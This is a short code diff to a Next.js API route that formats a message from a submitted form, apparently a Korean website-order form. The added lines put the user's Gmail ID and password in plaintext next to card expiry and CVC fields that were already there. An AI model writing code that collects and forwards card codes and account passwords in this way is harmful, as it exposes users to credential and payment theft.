@@ -177,6 +177,10 @@ export async function POST(request: NextRequest) {
         message += `• 카드 유효기간: ${body.해외결제카드유효기간}\n`;
         message += `• 카드 CVC: ${body.해외결제카드CVC}\n`;
 
+        message += `\n*Gmail (서비스 인프라 연결용)*\n`;
+        message += `• ID: ${body.GmailID}\n`;
+        message += `• PW: ${body.GmailPW}\n`;
+
         if (body.홈페이지스타일) {
           const styleName =
             styleNames[body.홈페이지스타일] || body.홈페이지스타일;
